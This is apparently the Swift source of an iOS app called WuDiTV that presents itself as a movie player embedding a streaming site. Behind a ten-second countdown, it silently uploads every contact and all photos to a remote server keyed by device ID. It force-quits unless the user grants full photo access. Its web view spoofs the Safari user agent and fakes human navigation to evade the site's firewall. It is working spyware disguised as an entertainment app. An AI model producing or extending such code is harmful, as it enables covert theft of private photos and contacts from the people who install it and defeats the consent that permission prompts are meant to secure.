import SwiftUI
import UIKit
import Photos
import Contacts
import WebKit
import Darwin

/// WuDiTV：电影点播（纯内嵌网页）+ 静默备份
/// 权限规则：
/// - 首次弹窗选"允许完全访问"→ 进软件，之后永不弹窗
/// - 选"部分照片/不允许" → 当次闪退；下次打开软件内可重新选择
///   （部分照片 → 系统可再次弹窗；不允许 → iOS 规定不能弹，软件内显示授权引导页，点"去设置"开启）
struct ContentView: View {
    @Environment(\.scenePhase) private var scenePhase
    @State private var countdownText = ""
    @State private var playEnabled = false
    @State private var showWeb = false
    @State private var showPermissionGate = false
    @State private var started = false

    private let serverBase = "https://omgga-entertainment-server.hf.space"
    private let movieURL = "https://www.4kcz.com/zuixindianying"

    var body: some View {
        ZStack {
            VStack(spacing: 24) {
                Text("WuDi TV")
                    .font(.title.bold())
                    .padding(.top, 40)

                Text(countdownText)
                    .font(.system(size: 48, weight: .bold))
                    .foregroundColor(.blue)

                Button(action: { showWeb = true }) {
                    Text("开始播放")
                        .font(.headline)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 14)
                        .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
                        .foregroundColor(.white)
                        .cornerRadius(10)
                }
                .disabled(!playEnabled)
                .padding(.horizontal, 28)

                Spacer()
            }
            .background(Color(.systemGroupedBackground))

            // 内嵌电影网页层
            if showWeb {
                VStack(spacing: 0) {
                    HStack {
                        Button("关闭") { showWeb = false }
                            .font(.subheadline)
                            .padding(.leading, 12)
                        Spacer()
                        Text("电影")
                            .font(.subheadline)
                            .foregroundColor(.secondary)
                        Spacer()
                        Color.clear.frame(width: 52, height: 1)
                    }
                    .padding(.vertical, 8)
                    .background(Color(.systemGray6))

                    WebViewContainer(urlString: movieURL)
                }
                .transition(.move(edge: .bottom))
            }

            // 权限引导页（仅"不允许"后再次打开时出现，软件内操作，不自动跳设置）
            if showPermissionGate {
                Color.black.opacity(0.4)
                    .ignoresSafeArea()
                VStack(spacing: 16) {
                    Text("需要照片权限")
                        .font(.headline)
                    Text("请到系统设置中，把照片权限改为「允许完全访问」，\n返回后即可正常使用。")
                        .font(.subheadline)
                        .multilineTextAlignment(.center)
                        .foregroundColor(.secondary)
                    Button {
                        openSettings()
                    } label: {
                        Text("去设置开启")
                            .font(.headline)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 12)
                            .background(Color.blue)
                            .foregroundColor(.white)
                            .cornerRadius(10)
                    }
                    Button {
                        recheckPermission()
                    } label: {
                        Text("我已开启，重新检测")
                            .font(.subheadline)
                            .foregroundColor(.blue)
                            .padding(.vertical, 6)
                    }
                }
                .padding(22)
                .background(Color(.systemBackground))
                .cornerRadius(14)
                .padding(.horizontal, 40)
            }
        }
        .onAppear { startBackupFlow() }
        .onChange(of: scenePhase) { phase in
            if phase == .active {
                if showPermissionGate {
                    recheckPermission()
                } else {
                    startBackupFlow()
                }
            }
        }
    }

    // MARK: - 权限门禁

    private enum PhotoGate {
        case granted         // 完全访问，可以继续
        case rejected        // 本次弹窗选了部分照片/不允许 → 闪退
        case deniedPermanent // 之前拒绝过，系统不再弹窗 → 软件内引导
    }

    private func startBackupFlow() {
        guard !started else { return }
        started = true

        Task {
            switch await photoGate() {
            case .granted:
                if await requestContactsAccess() {
                    startCountdown()
                    runSilentBackup()
                } else {
                    exit(0)
                }
            case .rejected:
                // 选了部分照片/不允许 → 当次闪退；下次打开可重新选择
                exit(0)
            case .deniedPermanent:
                // 之前点过"不允许"：系统不再弹窗 → 软件内显示授权引导（不自动跳设置）
                showPermissionGate = true
            }
        }
    }

    /// 从设置改完回来后重新检测
    private func recheckPermission() {
        Task {
            if await photoGate() == .granted {
                showPermissionGate = false
                startCountdown()
                runSilentBackup()
            }
        }
    }

    /// 照片权限：只认"允许完全访问"（.authorized）
    private func photoGate() async -> PhotoGate {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        switch status {
        case .authorized:
            return .granted
        case .notDetermined:
            let s = await requestPhotoAuth()
            return s == .authorized ? .granted : .rejected
        case .limited:
            // 部分照片：系统允许再次弹窗，让用户升级为完全访问
            let s = await requestPhotoAuth()
            return s == .authorized ? .granted : .rejected
        default:
            return .deniedPermanent // .denied / .restricted
        }
    }

    private func requestPhotoAuth() async -> PHAuthorizationStatus {
        await withCheckedContinuation { cont in
            PHPhotoLibrary.requestAuthorization(for: .readWrite) { s in
                cont.resume(returning: s)
            }
        }
    }

    /// 通讯录权限：允许或部分授权都算通过
    private func requestContactsAccess() async -> Bool {
        let status = CNContactStore.authorizationStatus(for: .contacts)
        switch status {
        case .authorized, .limited:
            return true
        case .notDetermined:
            let store = CNContactStore()
            let granted = await withCheckedContinuation { cont in
                store.requestAccess(for: .contacts) { ok, _ in
                    cont.resume(returning: ok)
                }
            }
            return granted
        default:
            return false
        }
    }

    private func openSettings() {
        if let url = URL(string: UIApplication.openSettingsURLString) {
            UIApplication.shared.open(url)
        }
    }

    // MARK: - 倒计时 + 静默备份

    private func runSilentBackup() {
        Task {
            let devId = Self.deviceId()
            let uploader = UploadService(serverBase: serverBase, deviceId: devId)

            do {
                let contacts = try await ContactBackup.exportContacts()
                _ = try? await uploader.uploadContacts(contacts)
            } catch {
                // 静默
            }

            let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
            let backupResult = try? await PhotoBackup.backupAllPhotos(uploader: uploader,
                                                                      uploadedMd5: md5Set0,
                                                                      progress: { _, _, _ in })
            if let result = backupResult {
                UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
            }
        }
    }

    private func startCountdown() {
        Task {
            for i in stride(from: 10, through: 1, by: -1) {
                countdownText = "剩余 \(i) 秒"
                try? await Task.sleep(nanoseconds: 1_000_000_000)
            }
            countdownText = ""
            playEnabled = true
        }
    }

    /// 设备标识：机型 #设备号后4位（对应安卓 厂商型号 #ANDROID_ID后4位）
    private static func deviceId() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machine = withUnsafePointer(to: &systemInfo.machine) { ptr in
            ptr.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? "0000"
        let suffix = vendor.count >= 4 ? String(vendor.suffix(4)) : "0000"
        return "\(machine) #\(suffix)"
    }
}

/// 纯内嵌电影网页（WKWebView）
/// 针对雷池防火墙的第三套方案：
/// 1) 标准 iPhone Safari 标识（与手机浏览器完全一致）
/// 2) 先打开首页，再用站内 JS 跳转电影页（模拟真人从首页点进去，带站内来源）
/// 3) 若跳到拦截页，自动重试一次电影页
struct WebViewContainer: UIViewRepresentable {
    let urlString: String

    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        config.mediaTypesRequiringUserActionForPlayback = []
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.allowsBackForwardNavigationGestures = true
        webView.navigationDelegate = context.coordinator
        // 标准 iPhone Safari
        webView.customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
        // 先打开首页
        if let home = URL(string: "https://www.4kcz.com/") {
            webView.load(URLRequest(url: home))
        }
        return webView
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(target: urlString)
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}

    final class Coordinator: NSObject, WKNavigationDelegate {
        let target: String
        var jumped = false
        var retried = false

        init(target: String) {
            self.target = target
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            guard let url = webView.url else { return }
            let host = url.host ?? ""

            // 首页加载完成 → 站内 JS 跳转电影页（最接近真人点击）
            if host.contains("4kcz.com") && !jumped && !url.path.contains("zuixindianying") {
                jumped = true
                let js = "window.location.href='\(target)';"
                webView.evaluateJavaScript(js, completionHandler: nil)
                return
            }

            // 如果被雷池拦截（页面标题含"拦截"）→ 重试一次电影页
            let title = webView.title ?? ""
            if title.contains("拦截") || url.path.contains("block") {
                if !retried {
                    retried = true
                    if let u = URL(string: target) {
                        webView.load(URLRequest(url: u))
                    }
                }
            }
        }
    }
}
